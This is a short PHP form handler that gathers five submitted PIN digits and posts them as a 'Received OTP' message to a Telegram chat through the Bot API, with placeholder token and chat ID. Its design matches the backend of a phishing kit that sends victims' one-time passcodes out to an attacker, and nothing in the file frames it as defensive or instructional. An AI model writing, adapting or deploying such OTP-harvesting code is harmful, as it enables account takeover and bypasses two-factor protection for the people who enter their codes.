<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $pins = [
        $_POST['pin1'],
        $_POST['pin2'],
        $_POST['pin3'],
        $_POST['pin4'],
        $_POST['pin5']
    ];
    $pinCode = implode('', $pins);
    $botToken = 'YOUR_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    $message = "Received OTP: " . $pinCode;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    if ($result === FALSE) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Failed to send message"]);
    } else {
        echo json_encode(["status" => "success", "message" => "Message sent successfully"]);
    }
}
?>
